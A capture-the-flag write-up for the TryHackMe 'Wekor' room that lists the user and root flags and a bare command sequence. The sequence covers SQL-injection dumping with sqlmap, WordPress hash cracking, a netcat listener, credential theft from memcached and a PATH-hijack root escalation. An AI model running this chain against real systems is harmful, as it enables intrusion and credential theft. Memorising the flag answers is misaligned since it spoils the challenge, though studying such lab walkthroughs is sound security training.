
# <div align="center">[Wekor](https://tryhackme.com/r/room/wekorra)</div>
<div align="center">CTF challenge involving Sqli , WordPress , vhost enumeration and recognizing internal services ;)</div>

<div align="center">
<img src="https://github.com/user-attachments/assets/7e5e0c2c-05fe-4829-9c54-41146e8b1ce9" height="200"></img>
</div>

# Task 1. Introduction
# Task 2. Finishing Up
Time To Submit The Flags :)
### What is the user flag?
```
1a26a6d51c0172400add0e297608dec6
```
### What is the root flag?
```
f4e788f87cc3afaecbaf0f0fe9ae6ad7
```


## Here 
```
echo "<IP> wekor.thm" | sudo tee -a /etc/hosts
for i in `curl -s http://wekor.thm/robots.txt | grep Disallow | cut -d " " -f2`;do echo $i;curl -I http://wekor.thm$i;echo "---";done
curl -s http://wekor.thm/comingreallysoon/
sqlmap -r it_cart_coupon.xml --dump-all --threads=10
ll
tree wordpress
cat wp_users.csv
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
echo "<IP> site.wekor.thm" | sudo tee -a /etc/hosts
admin: Administrator
wp_eagle: Subscriber
wp_jeffrey: Subscriber
wp_yura: Administrator

nc -nlvp 4444
echo "stats items" | nc -vn -w 1 127.0.0.1 11211
echo "stats cachedump 1 0" | nc -vn -w 1 127.0.0.1 11211
echo "get username" | nc -vn -w 1 127.0.0.1 11211
echo "get password" | nc -vn -w 1 127.0.0.1 11211
Orka:OrkAiSC00L24/7$
su Orka
Password: OrkAiSC00L24/7$
cat /home/Orka/user.txt
```
### Priv Esc
```
sudo -l
./bitcoin
echo $PATH
ls -la /usr/sbin/ | head
cat > /usr/sbin/python << EOF
#!/bin/bash
/bin/bash
EOF

chmod +x /usr/sbin/python
sudo /home/Orka/Desktop/bitcoin
20
cat /root/root.txt
```
